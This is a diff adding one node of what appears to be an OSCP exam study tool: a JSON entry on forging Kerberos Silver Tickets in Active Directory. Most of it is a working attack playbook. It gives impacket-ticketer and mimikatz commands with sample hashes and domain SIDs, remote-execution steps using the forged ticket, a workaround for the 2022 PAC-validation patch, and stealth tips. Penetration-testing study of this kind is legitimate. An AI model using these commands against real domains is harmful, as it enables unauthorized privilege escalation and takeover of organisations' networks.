@@ -1,0 +1,30 @@
+{
+  "id": "silver_tickets",
+  "phase": "AD",
+  "title": "Silver Tickets — Forge Service Tickets",
+  "body": "If you have a service account's NTLM hash (or AES key), you can forge service tickets for that SPN without ever talking to the KDC. The target service decrypts the ticket with its own password hash and trusts whatever's inside — including the group memberships you set. Forge yourself into Domain Admins on a service that doesn't validate the PAC against the DC, and you have admin access to that service.\n\nUnlike golden tickets (which require the krbtgt hash and grant domain-wide TGTs), silver tickets are scoped to one SPN. But they're stealthier — no TGT request hits the DC at all. The traffic is purely between you and the target service.\n\nWhen this matters on the exam: you cracked a service account from Kerberoasting, the account has weak privileges *but* the service is configured to trust 'Domain Admins' for high-impact operations. Forge a ticket showing you're in DA, access the service as DA, win the box.",
+  "cmd": "# ══════════════════════════════════════════════════\n# THE THREE INGREDIENTS YOU NEED\n# ══════════════════════════════════════════════════\n# 1. SPN's NTLM hash (or AES256 key)        — from Kerberoast crack, DCSync, or LSASS dump\n# 2. Domain SID (NOT the user's full SID)   — strip the trailing -RID off any user SID\n# 3. Target SPN                              — e.g. cifs/web04.corp.com or http/web04.corp.com\n\n# ══════════════════════════════════════════════════\n# GET THE DOMAIN SID\n# ══════════════════════════════════════════════════\n# From Windows (any domain user):\nwhoami /user                                  # take the SID, strip the trailing -NNNN\nGet-ADDomain | select DomainSID               # cleanest if RSAT installed\n\n# From Kali:\nimpacket-lookupsid 'domain.com/user:pass'@$ip 0\n\n# ══════════════════════════════════════════════════\n# FORGE FROM KALI — IMPACKET (preferred for OSCP)\n# ══════════════════════════════════════════════════\n# ticketer.py creates the .ccache, then export it for Linux tools\n\nimpacket-ticketer \\\n  -nthash 4d28cf5252d39971419580a51484ca09 \\\n  -domain-sid S-1-5-21-1987370270-658905905-1781884369 \\\n  -domain corp.com \\\n  -spn cifs/web04.corp.com \\\n  fakeadmin\n\n# Output: fakeadmin.ccache  (a Kerberos credential cache)\nexport KRB5CCNAME=$PWD/fakeadmin.ccache\n\n# Now use it with any impacket tool that supports -k -no-pass:\nimpacket-smbexec -k -no-pass web04.corp.com\nimpacket-psexec  -k -no-pass web04.corp.com\nimpacket-wmiexec -k -no-pass web04.corp.com\n\n# Use ticket with smbclient:\nsmbclient //web04.corp.com/admin\\$ -k\n\n# IMPORTANT: target by FQDN, not IP — Kerberos won't accept tickets for IPs\n\n# ══════════════════════════════════════════════════\n# FORGE FROM WINDOWS — MIMIKATZ\n# ══════════════════════════════════════════════════\n# /ptt = inject directly into current session (no file written)\n\nmimikatz # kerberos::golden \\\n  /sid:S-1-5-21-1987370270-658905905-1781884369 \\\n  /domain:corp.com \\\n  /target:web04.corp.com \\\n  /service:cifs \\\n  /rc4:4d28cf5252d39971419580a51484ca09 \\\n  /user:fakeadmin \\\n  /ptt\n\n# Confirm it loaded:\nklist\n\n# Use it (PowerShell — Kerberos auth follows automatically):\ndir \\\\web04.corp.com\\c$\niwr -UseDefaultCredentials http://web04.corp.com\n\n# ══════════════════════════════════════════════════\n# SERVICE TYPE BY TARGET — pick the right /service\n# ══════════════════════════════════════════════════\n# cifs    → SMB shares, file access, psexec/smbexec\n# http    → IIS, web apps with Windows auth\n# host    → general host access (often works as fallback)\n# ldap    → AD operations (rare — krbtgt usually needed for this)\n# mssqlsvc → SQL Server\n# rpcss   → DCOM, WMI\n# wsman   → WinRM (port 5985)\n\n# ══════════════════════════════════════════════════\n# AES256 INSTEAD OF NTLM — BETTER WHEN AVAILABLE\n# ══════════════════════════════════════════════════\n# Modern domains may reject RC4 tickets. If you have the AES key:\nimpacket-ticketer \\\n  -aesKey 0123456789abcdef... \\\n  -domain-sid S-1-5-... \\\n  -domain corp.com \\\n  -spn cifs/web04.corp.com \\\n  fakeadmin\n\n# Mimikatz equivalent: /aes256: instead of /rc4:\n\n# ══════════════════════════════════════════════════\n# COMMON FAILURE MODES\n# ══════════════════════════════════════════════════\n# KRB_AP_ERR_MODIFIED:\n#   Wrong hash. The service can't decrypt your ticket.\n#   Re-check: did you copy the hash exactly? Case-sensitive.\n#\n# KRB_AP_ERR_TKT_NYV (ticket not yet valid):\n#   Clock skew. sudo ntpdate $dc_ip\n#\n# Access denied even with valid ticket:\n#   - Service is doing PAC validation (rare but possible)\n#   - You're using IP not FQDN (Kerberos requires hostnames)\n#   - The /user you forged doesn't actually exist post-Oct-2022 patch\n#     → use a real domain user's name, just elevate their groups\n#\n# Post-2022 PAC patch (CVE-2022-37967):\n#   DCs now validate PAC_REQUESTOR against AD. Forging non-existent\n#   users fails. Workaround: forge as a real user (e.g. existing helpdesk\n#   account), but stuff DA group RIDs in their PAC.",
+  "warn": "Silver tickets are deterministic — same hash + same params = same ticket. They don't expire by default until 2032. If a blue team finds one ticket, they know to rotate the SPN's password (which invalidates every silver ticket forged from the old hash). Don't reuse forged tickets across targets if stealth matters.",
+  "choices": [
+    {
+      "label": "Got admin access via forged ticket — lateral movement",
+      "next": "lateral_movement"
+    },
+    {
+      "label": "Forged DA on the DC — domain owned",
+      "next": "ad_complete"
+    },
+    {
+      "label": "Service rejected ticket — try Pass the Hash instead",
+      "next": "pth"
+    },
+    {
+      "label": "Want to forge domain-wide TGTs — need krbtgt hash",
+      "next": "dcsync"
+    },
+    {
+      "label": "Back to AD menu",
+      "next": "jump_ad"
+    }
+  ]
+}
